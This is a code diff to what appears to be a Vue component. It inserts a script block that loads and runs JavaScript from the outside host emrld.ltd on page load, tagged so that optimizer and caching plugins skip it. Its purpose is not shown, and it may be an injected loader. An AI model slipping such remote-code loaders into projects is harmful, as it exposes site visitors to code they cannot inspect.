@@ -28,6 +28,14 @@ onBeforeMount(async () => {
 
 
 </script>
+<script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://emrld.ltd/NDkzMjQw.js?t=493240';
+      document.head.appendChild(script);
+  })();
+</script>
 <template>
   <a-config-provider :theme="{
     token: {
